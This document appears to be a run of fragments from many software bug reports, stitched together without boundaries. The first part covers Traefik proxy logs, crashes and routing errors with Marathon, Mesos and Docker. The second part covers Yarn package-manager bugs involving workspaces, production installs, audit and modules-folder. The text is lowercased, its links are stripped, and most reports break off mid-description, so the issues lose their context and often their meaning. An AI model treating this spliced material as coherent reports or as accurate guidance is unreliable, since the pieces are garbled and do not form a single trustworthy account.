time="2017-04-05t10:07:33z" level=info msg="starting provider *provider.marathon {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"endpoint\\":\\" ",\\"domain\\":\\"marathon.localhost\\",\\"exposedbydefault\\":true,\\"groupsassubdomains\\":true,\\"dcostoken\\":\\"\\",\\"marathonlbcompatibility\\":true,\\"tls\\":null,\\"dialertimeout\\":60,\\"keepalive\\":10,\\"basic\\":null}"
time="2017-04-05t10:07:33z" level=info msg="starting provider *main.webprovider {\\"address\\":\\":8080\\",\\"certfile\\":\\"\\",\\"keyfile\\":\\"\\",\\"readonly\\":false,\\"statistics\\":null,\\"metrics\\":null,\\"auth\\":null}"
time="2017-04-05t10:07:33z" level=info msg="starting provider *provider.mesos {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"endpoint\\":\\"zk://mesos3.domain.xyz:2181,mesos4.domain.xyz:2181,mesos5.domain.xyz:2181/mesos\\",\\"domain\\":\\"mesos.localhost\\",\\"exposedbydefault\\":true,\\"groupsassubdomains\\":false,\\"zkdetectiontimeout\\":30,\\"refreshseconds\\":30,\\"ipsources\\":\\"mesos\\",\\"statetimeoutsecond\\":30,\\"masters\\":null}"
time="2017-04-05t10:07:33z" level=info msg="starting server on :80"
time="2017-04-05t10:07:33z" level=warning msg="clienttls is nil"
time="2017-04-05t10:07:33z" level=debug msg=mesos
time="2017-04-05t10:07:33z" level=debug msg="starting master detector for zk %!(extra string=zk://mesos3.domain.xyz:2181,mesos4.domain.xyz:2181,mesos5.domain.xyz:2181/mesos)"
2017/04/05 10:07:33 structs.go:21: connected to 10.107.19.21:2181
2017/04/05 10:07:33 structs.go:21: authenticated: id=97688275774341178, timeout=40000
time="2017-04-05t10:07:33z" level=debug msg="new masters detected: [10.107.19.21:5050]"
time="2017-04-05t10:07:33z" level=debug msg="filtering marathon task without port %s/traefik/docker-1"
time="2017-04-05t10:07:33z" level=debug msg="filtering marathon task without port %s/traefik/mesos-1"
time="2017-04-05t10:07:33z" level=debug msg="configuration received from provider marathon: {}"
time="2017-04-05t10:07:33z" level=debug msg="last marathon config received more than 2s, ok"
time="2017-04-05t10:07:33z" level=info msg="server configuration reloaded on :80"
time="2017-04-05t10:07:33z" level=debug msg="filtering mesos task without port mesos-1.traefik"
time="2017-04-05t10:07:33z" level=debug msg="new masters detected: [10.107.19.21:5050 10.107.19.23:5050 10.107.19.22:5050]"
time="2017-04-05t10:07:33z" level=debug msg="load balancer method \'<nil>\' for backend backend-docker-1-traefik: invalid method, using default
using default wrr."
time="2017-04-05t10:07:33z" level=debug msg="configuration received from provider mesos: {\\"backends\\":{\\"backend-docker-1-traefik\\":{\\"servers\\":{\\"server-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1\\":{\\"url\\":\\" ",\\"weight\\":0}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-docker-1-traefik\\",\\"routes\\":{\\"route-hosttraefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1\\":{\\"rule\\":\\"host:docker-1.traefik.mesos.localhost\\"}},\\"priority\\":0}}}"
time="2017-04-05t10:07:33z" level=debug msg="last mesos config received less than 2s, waiting..."
time="2017-04-05t10:07:33z" level=debug msg="filtering mesos task without port mesos-1.traefik"
time="2017-04-05t10:07:33z" level=debug msg="load balancer method \'<nil>\' for backend backend-docker-1-traefik: invalid method, using default
using default wrr."
time="2017-04-05t10:07:33z" level=debug msg="configuration received from provider mesos: {\\"backends\\":{\\"backend-docker-1-traefik\\":{\\"servers\\":{\\"server-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1\\":{\\"url\\":\\" ",\\"weight\\":0}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-docker-1-traefik\\",\\"routes\\":{\\"route-hosttraefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1\\":{\\"rule\\":\\"host:docker-1.traefik.mesos.localhost\\"}},\\"priority\\":0}}}"
time="2017-04-05t10:07:33z" level=debug msg="last mesos config received less than 2s, waiting..."
time="2017-04-05t10:07:35z" level=debug msg="waited for mesos config, ok"
time="2017-04-05t10:07:35z" level=debug msg="creating frontend frontend-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1"
time="2017-04-05t10:07:35z" level=debug msg="wiring frontend frontend-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1 to entrypoint http"
time="2017-04-05t10:07:35z" level=debug msg="creating route route-hosttraefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1 host:docker-1.traefik.mesos.localhost"
time="2017-04-05t10:07:35z" level=debug msg="creating backend backend-docker-1-traefik"
time="2017-04-05t10:07:35z" level=debug msg="creating load-balancer wrr"
time="2017-04-05t10:07:35z" level=debug msg="creating server server-traefik-docker-1-bf60da40-19e5-11e7-8fb4-02427ff3bac1 at with weight 0"
time="2017-04-05t10:07:35z" level=info msg="server configuration reloaded on :80"
time="2017-03-30t13:53:16z" level=debug msg="challenge getcertificate intentionally.changed.domain.tld"
time="2017-03-30t13:53:16z" level=debug msg="loading acme certificates [intentionally.changed.domain.tld]..."
legolog: 2017/03/30 13:53:16 [info][intentionally.changed.domain.tld] acme: obtaining bundled san certificate
panic: runtime error: invalid memory address or nil pointer dereference
[signal sigsegv: segmentation violation code= addr= pc= ] goroutine 305 [running]:
panic( , ) /usr/local/go/src/runtime/panic.go:500 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getchallenges.func1( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:543 +
created by github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getchallenges /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:557 +
nothing (see above traefik and chrome console logs)
visiting host:8080 (see docker-compose config above) and trying the same thing (only nginx reverse proxy, without traefk) works fine
**not working**: traefik->nginx->websocket->weechat relay
**working**: nginx->websocket->weechat relay
crashing service every 2s, with systemd starting it again
adjusting watchdog timings correlate with time between crashes
traefik keeps sending requests to "server1" even when this server does not have any associated url
as a result, clients get _500 internal server error_.
`error presenting token: storeconfig error: unexpected response code: 413 (value exceeds 524288 byte limit)]` searching for this i came across this commit which mentiones the 512kb limit
my thoughts about a solution is along the lines of serializing the acme account data into keys and values instead of json so they use the kv store "properly".
nothing --- while putting old school label `--label traefik.port=8080` is working this .visualizer
as `<service-name>` is not (`--label traefik.visualizer.port=8080`)
`<service-name>` was introduced in
if i go on url jenkins.localhost.loc with port 80, i redirect to traefik monitoring page,
2017/03/15 17:41:12 connected to 10.0.4.73:2181
2017/03/15 17:41:12 authenticated: id=97413602563260474, timeout=30000
2017/03/15 17:41:13 structs.go:21: connected to 10.0.4.73:2181
2017/03/15 17:41:13 structs.go:21: authenticated: id=97413602563260475, timeout=30000
erro[2017-03-15t17:41:13z] datastore sync error: object lock value: expected edee9a61-cb84-4c6d-84ad-ea8eb211b28f, got , retrying in 748.957544ms erro[2017-03-15t17:41:13z] datastore sync error: object lock value: expected edee9a61-cb84-4c6d-84ad-ea8eb211b28f, got , retrying in 1.069770067s erro[2017-03-15t17:41:14z] datastore sync error: object lock value: expected edee9a61-cb84-4c6d-84ad-ea8eb211b28f, got , retrying in 1.134574728s erro[2017-03-15t17:41:16z] datastore sync error: object lock value: expected edee9a61-cb84-4c6d-84ad-ea8eb211b28f, got , retrying in 1.27403991s erro[2017-03-15t17:41:17z] datastore sync error: object lock value: expected edee9a61-cb84-4c6d-84ad-ea8eb211b28f, got , retrying in 3.054537854s erro[2017-03-15t17:41:20z] datastore sync error: object lock value: expected edee9a61-cb84-4c6d-84ad-ea8eb211b28f, got , retrying in 3.868985073s ```
most of the keys were created, but some were not
specifically `traefik/acme/acmelogging` and `traefik/acme/dnsprovider` were not created.
i get an http error : `502 bad gateway` just to confirm, the ip address of the trace container 10.16.0.3 is indeed not routable
so the problem seems to come from traefik using the ip address provided by marathon instead of the endpoint
is that normal (in which case do you know of a way to configure marathon to provide the ip address of the docker host) or is it a bug or configuraton issue with traefik ? in anycase it seems uncoherent to me as the ip address is the address of the container and the port is the exported port (hence on the docker host.) #### the traefik log
```shell info[2017-03-07t11:41:34+01:00] traefik version v1.2.0-rc2 built on 2017-03-01_01:13:09pm info[2017-03-07t11:41:34+01:00] using toml configuration file /root/traefik/conf.toml debu[2017-03-07t11:41:34+01:00] global configuration loaded {"gracetimeout":10,"debug":true,"checknewversion":true,"accesslogsfile":"log/access.log","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":"infra-q-i-mes01:8008","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"insecureskipverify":false,"retry":null,"docker":null,"file":null,"web":{"address":":8009","certfile":"","keyfile":"","readonly":false,"statistics":{"recenterrors":10},"metrics":null,"auth":null},"marathon":{"watch":true,"filename":"","constraints":[],"endpoint":" ","domain":"infra-q-i-mes01","exposedbydefault":true,"groupsassubdomains":false,"dcostoken":"","marathonlbcompatibility":false,"tls":null,"dialertimeout":60,"keepalive":10,"basic":null},"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null} info[2017-03-07t11:41:34+01:00] preparing server http &{network: address:infra-q-i-mes01:8008 tls:<nil> redirect:<nil> auth:<nil> compress:false} info[2017-03-07t11:41:34+01:00] starting provider *provider.marathon {"watch":true,"filename":"","constraints":[],"endpoint":" ","domain":"infra-q-i-mes01","exposedbydefault":true,"groupsassubdomains":false,"dcostoken":"","marathonlbcompatibility":false,"tls":null,"dialertimeout":60,"keepalive":10,"basic":null} info[2017-03-07t11:41:34+01:00] starting provider *main.webprovider {"address":":8009","certfile":"","keyfile":"","readonly":false,"statistics":{"recenterrors":10},"metrics":null,"auth":null} info[2017-03-07t11:41:34+01:00] 0s info[2017-03-07t11:41:34+01:00] starting server on infra-q-i-mes01:8008 warn[2017-03-07t11:41:34+01:00] clienttls is nil debu[2017-03-07t11:41:34+01:00] creating frontend frontend-trace debu[2017-03-07t11:41:34+01:00] wiring frontend frontend-trace to entrypoint http debu[2017-03-07t11:41:34+01:00] creating route route-host-trace pathprefix:/trace debu[2017-03-07t11:41:34+01:00] creating backend backend-trace debu[2017-03-07t11:41:34+01:00] creating load-balancer wrr debu[2017-03-07t11:41:34+01:00] sticky session with cookie _traefik_backend debu[2017-03-07t11:41:34+01:00] creating server server-trace-8790b0ed-0036-11e7-8a86-0242c8fc4f18 at with weight 0 info[2017-03-07t11:41:34+01:00] server configuration reloaded on infra-q-i-mes01:8008 warn[2017-03-07t11:45:09+01:00] error forwarding to err: dial tcp 10.16.0.3:31855: getsockopt: connection refused ```
traefik throws following error at stdout and then redirects the logs to stdout ```shell
time="2017-03-02t04:13:55z" level=error msg="error opening fileopen \\"/app/logs/access.log\\": no such file or directory" time="2017-03-02t04:13:55z" level=error msg="error opening fileopen \\"/app/logs/traefik.log\\": no such file or directory" time="2017-03-02t04:13:55z" level=info msg="traefik version v1.1.2 built on 2016-12-15_10:21:15am" time="2017-03-02t04:13:55z" level=error msg="error opening fileopen \\"/app/logs/access.log\\": no such file or directory" ```
the preview window is empty and after some time traefik logs the follwoing: ```
time="2017-02-23t13:17:59+01:00" level=warning msg="error copying upstream response body: net/http: request canceled"
``` the request keeps being marked as pending in the browser, when closing the browser the request will be logged as cancelled, like noted above.
do not reload when rules.toml file is changed
gateway timeout
that some traffic from f1 (primary traffic to `admin.foobar.com`) get forwarded to b5 another thing i observed, none of the request which is forwarded to the wrong server is in the access log, also i haven't be able to reproduce the issue with `curl`, but i did look at the headers with help from tcpdump and everything looked as it should (i have posted log in the slack [channel](
edit: another thing, b5 is used for websocket, if that has anything to say
maybe that somehow screw something up? also feel free to ping me on the slack channel
/cc @containous
time="2017-02-01t13:44:31-08:00" level=error msg="failed to list containers for docker, error error response from daemon: client version 1.21 is too old
minimum supported api version is 1.24, please upgrade your client to a newer version" ``` i did a proof of concept which works by [patching `provider/docker.go`]( to use api version 1.24
should i send this change as pr? i don't know if that would be fine on linux as traefik would no longer work with older docker engines
you can find my test setup for windows at
instead of appending the subdirectory `/dashboard/` to the current url, the following html is received:
<a href="/dashboard/">found</a>.
this breaks the pathprefixstrip frontend rule and instead directs to which results in a 404.
traefik generated a backend server url of ` ` and then consuming all memory of the host, in this case 2.7gb ram and locking up the host completely until traefik is killed
this continously happens once traefik is restarted after being killed
setting a published port on the service fixes the issue.
a single frontend plus two backends
the preferred website (the first nginx container) is no longer reachable as it doesn't have a corresponding frontend
### what do you think has happened? it seems that both `traefik.frontend.rule=host:luna.liefdevolafscheid.nl` and `traefik.frontend.rule=host:luna-liefdevolafscheid.nl` result in a route with the name (`route-frontend-host-luna-liefdevolafscheid-nl`) so that what should be adding a route becomes overwriting.
i download directly in 2 sec and i got 6 sec through traefik
the traefik process use 50/60% cpu for 3 sec
at the end, the traefik process take 4.626g virtual ram (top) instead of classical ~100m
that ram is released few minutes later (garbage collect ?) i can't use traefik to route those requests, i have some big files, like 20/30 gb
how traefik works for that ?
why it have to store those data in ram ? thanx for reading
the default '/traefik' key is created in etcd, always.
but the following backends, frontends keys cannot be created
note: i'm trying to move from vulcand and the etcd configuration is working with a vulcand instance, i assume this means it's correctly set, maybe i'm wrong?
i've seen that the operations `docker login` and `docker pull` work correctly, but `docker push` does not work when i use traefik
more precisely this is what i see when i launch the operation without traefik:
docker push registry.mydomain.com/my-image:latest
the push refers to a repository [registry.mydomain.com/my-image]
e7525efc7275: layer already exists
6d7504772167: pushed
192e9fad2abc: pushed
36e9226e74f8: pushed
011b303988d2: pushed
v0.1.2: digest: sha256:8328c5a194a95b453b0b7b3456861a1456b5700190bafbd6d419cd8d13b08c0f size: 1363
``` and this what i see when traefik is routing the push:
docker push registry.mydomain.com/my-image:latest
the push refers to a repository [registry.mydomain.com/my-image]
e7525efc7275: pushing [==================================================>] 6.144 kb
6d7504772167: pushing [==================================================>] 4.608 kb
192e9fad2abc: pushing [==================================================>] 3.584 kb
36e9226e74f8: pushing [> ] 506.9 kb/50.1 mb
011b303988d2: pushing [==================================================>] 4.836 mb
blob upload unknown
this is the final output, after many retries and some sleeps between
in the nginx container logs i can see: ```
10.0.0.14 - myusername [22/dec/2016:01:12:55 +0000] "post /v2/my-image/blobs/uploads/ http/1.1" 202 0 "-" "docker/1.12.5 go/go1.6.4 git-commit/7392c3b kernel/4.4.39-moby os/linux arch/amd64 upstreamclient(docker-client/1.12.5 \\x5c(darwin\\x5c))"
but when the same operation was done without traefik i see requests like these as well:
10.255.0.2 - myusername [22/dec/2016:01:28:38 +0000] "patch /v2/my-image/blobs/uploads/43050fd4-b313-4a1c-b425-b7aebda549a4?_state=8fnemdrg3msdrxxdakjqsbp2h43z2xuehzj7baoisp57ik5hbwuioijiyxnpl25naw54lxjlz2lzdhj5iiwivvvjrci6ijqzmduwzmq0lwizmtmtngexyy1indi1lwi3ywvizge1ndlhncisik9mznnldci6mcwiu3rhcnrlzef0ijoimjaxni %3d http/1.1" 202 0 "-" "docker/1.12.5 go/go1.6.4 git-commit/7392c3b kernel/4.4.39-moby os/linux arch/amd64 upstreamclient(docker-client/1.12.5 \\x5c(darwin\\x5c))"
10.255.0.2 - myusername [22/dec/2016:01:28:39 +0000] "put /v2/my-image/blobs/uploads/43050fd4-b313-4a1c-b425-b7aebda549a4?_state=ec26otcqha86qm0vcsfkmejgtams0z4pknbkhc4wocn7ik5hbwuioijiyxnpl25naw54lxjlz2lzdhj5iiwivvvjrci6ijqzmduwzmq0lwizmtmtngexyy1indi1lwi3ywvizge1ndlhncisik9mznnldci6ndg4lcjtdgfydgvkqxqioiiymde2lteyltiyvdaxoji4ojm4wij9&digest=sha256%3aaa8a6a9d70674453b1ad55abdd0c10ef95ddbeef80fd7d5641af4dcf46c9420a http/1.1" 201 0 "-" "docker/1.12.5 go/go1.6.4 git-commit/7392c3b kernel/4.4.39-moby os/linux arch/amd64 upstreamclient(docker-client/1.12.5 \\x5c(darwin\\x5c))"
``` does this mean that traefik is having problems with patch and/or put operations?
some stopped and removed containers still have frontend and backend configuration
the backend configurations left have url with empty address (` `)
if i make a request matching one of the frontends with empty backend url address i see this in the log: ```
$ curl -v
* rebuilt url to:
* trying 1.2.3.4...
* tcp_nodelay set
* connected to removed.com (1.2.3.4) port 443 (#0)
* tls 1.2 connection using tls_ecdhe_rsa_with_aes_128_gcm_sha256
* server certificate: removed.com
* server certificate: let's encrypt authority x3
* server certificate: dst root ca x3
> get / http/1.1
> host: removed.com
> user-agent: curl/7.51.0
> accept: */*
< http/1.1 302 found
< content-length: 5
< content-type: text/plain; charset=utf-8
< date: wed, 21 dec 2016 18:21:39 gmt
< location:
* curl_http_done: called premature == 0
* connection #0 to host removed.com left intact
traefik_1 |127.0.0.1 - - [21/dec/2016:18:20:02 +0000] "get / http/1.1" 302 5 "" "curl/7.51.0" 16275 "" "" 0ms
traefik_1 |155.4.238.15 - - [21/dec/2016:18:20:02 +0000] "get / http/1.1" 302 5 "" "curl/7.51.0" 16274 "host-removed" " " 1ms
no idea why i get a redirect response
*update:* probably because traefik connect to itself on port 80 and hits `entrypoints.http.redirect` not sure but for some reason it seems like the empty address causes traefik to connect 127.0.0.1 causing the two log lines
but that is just my speculations
traefik restart fixes the problem.
yarn resultions are not respected
warning package.json: no license field
resolving ^1.21.1 to a url...
error an unexpected error occurred: "request.filter is not a function".
info if you think this is a bug, please open a bug report with the information provided in "/users/me/projects/yarn1-test/yarn-error.log".
info visit for documentation about this command.
yarn.lock is not working with yarn workspaces
i am using yarn workspaces for my project
i have a dependency in a workspace with a caret/tilde before its version
but whenever i run yarn install --pure-lockfile or yarn install --frozen-lock file, the dependency gets updated to latest version and does not honour yarn.lock whenever the library owner publishes a new version
this leads to breaking my app's build due to non-compatible changes in newer version
**if the current behavior is a bug, please provide the steps to reproduce.** [repo link](
i have created a sample repo with setup
please follow the following steps to reproduce:
1) clone the repo.
2) do fresh yarn install.
3) now add caret to the dependency "cross-env" mentioned in workspace-b.
4) run yarn install again (with --pure-lockfile or --frozen-lockfile)
5) check yarn.lock doesn't get updated but in node modules new version is installed.
yarn keeps installing devdependencies regardless of `--prod` flag
tested with `--prod`, `--production`, `production=true`, `node_env=production`.
running `npm install --prod=true` results the correct `node_modules`
**if the current behavior is a bug, please provide the steps to reproduce.**
- run `yarn install --prod`
- check `node_modules` and `@types` or `prisma2` folders are there.
you make a directory in your project folder called`lib`
you run `cd lib; yarn add some-module --modules-folder .` because you want to install a specific dependency outside of node_modules
you get an error telling you a file is missing ...
because yarn deleted all of the files in your project folder (apart from lib and yarn-error.log)
you slowly back away from the computer
this is not your day
**if the current behavior is a bug, please provide the steps to reproduce.**
although i wouldn't recommend it.
`yarn bin` does not respect `modules-folder` **if the current behavior is a bug, please provide the steps to reproduce.**
$ yarn add webpack --modules-folder vendor/node_modules/
$ ls vendor/node_modules/.bin/
acorn atob errno json5 miller-rabin mkdirp rimraf sha.js terser webpack
$ yarn bin webpack --modules-folder vendor/node_modules/
error couldn\'t find a binary named "webpack"
$ yarn bin --modules-folder vendor/node_modules/
/tmp/test/node_modules/.bin
there are two ways to set the `--ignore-scripts` cli option via a project-root `.yarnrc`: ```
# first method
ignore-scripts true
``` ...and: ```
# second method
--ignore-scripts true
``` whilst the first method appears to work fine (since the `yarn install` output starts displaying messages like ` warning ignored scripts due to flag.`), it doesn't cause the fix from #6820 to take effect
yarn-test $ yarn add --pnp webpack-cli@3.2.1
yarn add v1.13.0
[5/5] building fresh packages...
warning ignored scripts due to flag.
done in 1.29s.
yarn-test $ ls .pnp/unplugged/
npm-webpack-cli-3.2.1-779c696c82482491f0803907508db2e276ed3b61/
``` instead if the second method is used, then both the console message and the plug and play fix take effect: ```
yarn-test $ yarn add --pnp webpack-cli@3.2.1
yarn add v1.13.0
[5/5] building fresh packages...
warning ignored scripts due to flag.
done in 1.17s.
yarn-test $ ls .pnp/unplugged/
ls: cannot access '.pnp/unplugged/': no such file or directory
``` **if the current behavior is a bug, please provide the steps to reproduce.**
`mkdir yarn-test && cd $_`
`echo 'ignore-scripts true' > .yarnrc`
`yarn add --pnp webpack-cli@3.2.1` (this version of webpack-cli uses a postinstall script)
`ls .pnp/unplugged/`
list and audit do not consider resolutions
**if the current behavior is a bug, please provide the steps to reproduce.** package.json ```json
{ "dependencies": { "@angular-devkit/build-angular": "0.10.5" }, "resolutions": { "@angular-devkit/build-angular/webpack-dev-server": "3.1.14" }
``` only version 3.1.14 of webpack-dev-server is installed ```
$ yarn install
$ find node_modules -path \'**/webpack-dev-server/package.json\' | xargs grep \'"version"\' "version": "3.1.14",
``` but ```
$ yarn list | grep webpack-dev-server
webpack-dev-server@3.1.8
webpack-dev-server@3.1.14
$ yarn audit
high missing origin validation
package webpack-dev-server
patched in >=3.1.11
dependency of @angular-devkit/build-angular
path @angular-devkit/build-angular > webpack-dev-server
more info
`yarn upgradeinteractive --latest` doesn\'t seem to show the latest package versions, or i\'m missing out something? for example, `"react": "^16.6.3",` in `package.json`, while `react@16.7.0` is already available? i was able to successfully use the command some hours before to update some really old packages
i also tried to delete the `node_modules` directory incl
`yarn.lock` file, which unfortunately didn't help to resolve this issue
$ yarn upgradeinteractive --latest
yarn upgradeinteractive v1.12.3
success all of your dependencies are up to date.
done in 0.56s.
``` **if the current behavior is a bug, please provide the steps to reproduce.** please see above.
when i try to do `yarn add another-workspace --peer` in a yarn workspace, it ignores the --peer flag and adds it as a regular dependency
same with --dev
**if the current behavior is a bug, please provide the steps to reproduce.**
clone and run `yarn install`, then go to `example-yarn-workspace-6` and say `yarn add example-yarn-workspace-4 --peer`
it will get added as a regular dependency
same thing happens if you use --dev.
`yarn` errors when a resolution for an optional dependency is specified if run on an incompatable platform
fsevents is only available on macos (darwin): ```
"resolutions": { "**/fsevents": ">=1.2.4"
root@fbcb6ce8bfb9:/# yarn
yarn install v1.12.3
[1/5] validating package.json...
[2/5] resolving packages...
[3/5] fetching packages...
error fsevents@2.0.1: the platform "linux" is incompatible with this module.
error found incompatible module
info visit for documentation about this command.
``` without the above resolutions `yarn` runs without error: ```
root@fbcb6ce8bfb9:/# yarn
yarn install v1.12.3
[1/5] validating package.json...
[2/5] resolving packages...
[3/5] fetching packages...
info fsevents@1.2.4: the platform "linux" is incompatible with this module.
info "fsevents@1.2.4" is an optional dependency and failed compatibility check
excluding it from installation.
info fsevents@1.1.2: the platform "linux" is incompatible with this module.
info "fsevents@1.1.2" is an optional dependency and failed compatibility check
excluding it from installation.
[4/5] linking dependencies...
`yarn add <path to tarball>` results in stale contents from a previous unpacking in node_modules **if the current behavior is a bug, please provide the steps to reproduce.** ```console
$ docker run -it node:11.4.0 bash
``` paste input:
cd && mkdir app dep # create original dep tarball
cd ~/dep && yarn init -y && echo '*** old ***' > index.js && yarn pack # install it
cd ~/app && yarn init -y && yarn add ~/dep/dep-v1.0.0.tgz # see what it contains
cat node_modules/dep/index.js # make new dep tarball
cd ~/dep && echo '*** new ***' > index.js && rm dep-v1.0.0.tgz && yarn pack # try to install it but get old contents
cd ~/app && yarn add ~/dep/dep-v1.0.0.tgz && cat node_modules/dep/index.js # "did you try turning it off and on again?"
cd ~/app && yarn add ~/dep/dep-v1.0.0.tgz && cat node_modules/dep/index.js
``` output:
root@a94fc136c282:/# cd && mkdir app dep
root@a94fc136c282:~# root@a94fc136c282:~# # create original dep tarball
root@a94fc136c282:~# cd ~/dep && yarn init -y && echo '*** old ***' > index.js && yarn pack
yarn init v1.12.3
warning the yes flag has been set
this will automatically answer yes to all questions, which may have security implications.
success saved package.json
done in 0.03s.
yarn pack v1.12.3
success wrote tarball to "/root/dep/dep-v1.0.0.tgz".
done in 0.04s.
root@a94fc136c282:~/dep# root@a94fc136c282:~/dep# # install it
root@a94fc136c282:~/dep# cd ~/app && yarn init -y && yarn add ~/dep/dep-v1.0.0.tgz
yarn init v1.12.3
warning the yes flag has been set
this will automatically answer yes to all questions, which may have security implications.
success saved package.json
done in 0.03s.
yarn add v1.12.3
info no lockfile found.
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages..
success saved lockfile.
success saved 1 new dependency.
info direct dependencies
dep@1.0.0
info all dependencies
dep@1.0.0
done in 0.14s.
root@a94fc136c282:~/app# root@a94fc136c282:~/app# # see what it contains
root@a94fc136c282:~/app# cat node_modules/dep/index.js *** old ***
root@a94fc136c282:~/app# root@a94fc136c282:~/app# # make new dep tarball
root@a94fc136c282:~/app# cd ~/dep && echo '*** new ***' > index.js && rm dep-v1.0.0.tgz && yarn pack
yarn pack v1.12.3
success wrote tarball to "/root/dep/dep-v1.0.0.tgz".
done in 0.05s.
root@a94fc136c282:~/dep# root@a94fc136c282:~/dep# # try to install it but get old contents
root@a94fc136c282:~/dep# cd ~/app && yarn add ~/dep/dep-v1.0.0.tgz && cat node_modules/dep/index.js
yarn add v1.12.3
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 1 new dependency.
info direct dependencies
dep@1.0.0
info all dependencies
dep@1.0.0
done in 0.11s.
*** old ***
root@a94fc136c282:~/app# root@a94fc136c282:~/app# # "did you try turning it off and on again?"
root@a94fc136c282:~/app# cd ~/app && yarn add ~/dep/dep-v1.0.0.tgz && cat node_modules/dep/index.js
yarn add v1.12.3
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved 0 new dependencies.
done in 0.08s.
*** new *** ```
`yarn install --production` will install `devdependencies` package that is specified in dependency package is specified to `peerdependencies`
[http-aws-es]( #l21) package is specified `aws-sdk` as `peerdependency` , that package is not in `dependencies` in main project
**if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn init -y
yarn add http-aws-es
yarn install --production // only http-aws-es packge in node_modules.
yarn add -d aws-sdk
yarn install --production // aws-sdk package is in node_modules.
rm -fr node_modules
yarn install --production // still aws-sdk package is in node_modules.
``` then `aws-sdk` package and its dependencies are installed in `node_modules` even if `aws-sdk` is devdependencies.
sequential adds made through composer script don't complete installation of all packages, however yarn.lock says they're installed
any composer.json with the following lines should be enough
run it through` composer run-script post-install-cmd` ```
"post-install-cmd": [ "yarn add font-awesome@4.7 --modules-folder tmp_assets/", "yarn add bootstrap@3.3 --no-dev --modules-folder tmp_assets/", "yarn add respond.js@1.4 --modules-folder tmp_assets/", "yarn add html5shiv@3.7 --modules-folder tmp_assets/"
`yarn audit` set the `exit code` related to the number of issues found.
if the number of issues is greater than 255 the exit code overflows
this means that if are found exactly 256 issues the exit code is 0
**if the current behavior is a bug, please provide the steps to reproduce.**
this is a package.json crafted to trigger exactly 256 issues
when an http request for a tarball fails with a non-200 exit code (like 401 or 500), yarn doesn't seem to properly catch it
this cause the error response to be treated as the tarball, which cause invalid reporting (usually "unexpected end of archive")
**also see:**
this is the part of the code that's affected:
#l231-l243 we provide a `process` option, so we never set the `callback` function that usually catch non-200 exit code:
#l407 **if the current behavior is a bug, please provide the steps to reproduce.**
it happens randomly based on the npm registry flakiness.
if using `yarn audit` from a monorepo, if the root `package.json` does not have `name` and `version` fields, then the npm audit api will return an http 500
**if the current behavior is a bug, please provide the steps to reproduce.** make a monorepo with no `name` and `version` in the root package.json and run `yarn audit` this is related to #6611 but where the monorepo root is missing the fields instead of individual packages
since the monorepo root isn't really a publishable npm package, we shouldn't assume that it would have to have a name and version.
$ yarn audit --network-timeout=120000
yarn audit v1.12.3
/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:65876 throw new (_errors || _load_errors()).responseerror(_this3.reporter.lang(\'requestfailed\', description), res.statuscode); ^ error: request failed "500 internal server error" at responseerror.extendablebuiltin (/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:702:66) at new responseerror (/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:808:124) at request.params.callback [as _callback] (/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:65876:19) at request.self.callback (/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:129018:22) at emittwo (events.js:126:13) at request.emit (events.js:214:7) at request.<anonymous> (/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:129990:10) at emitone (events.js:116:13) at request.emit (events.js:211:7) at incomingmessage.<anonymous> (/home/quentin/.config/yarn/global/node_modules/yarn/lib/cli.js:129912:12)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
here is the verbose output of the command :
[audit_verbose.txt]( **please mention your node.js, yarn and operating system version.**
node v8.11.4
yarn v1.12.3 (latest)
system : opensuse tumbleweed
`yarn install` installs devdependencies of dependencies in my package.json
`yarn install --prod` avoids this, but it also doesn't install devdependencies in my package.json
yarn audit doesn't report vulnerable dependencies in a yarn workspace package, even though the vulnerable package is listed in yarn.lock **if the current behavior is a bug, please provide the steps to reproduce.** make a repo using yarn workspaces, add minimatch@3.0.0 as a dependency in one of the workspaces, run `yarn install` and `yarn audit` here's an example repo that reproduces the issue:
yarn skips installing dependencies for packages with no version field in workspace but it successfully installs dependencies for the same package when it is outside of workspace
**if the current behavior is a bug, please provide the steps to reproduce.**
from this repro repository:
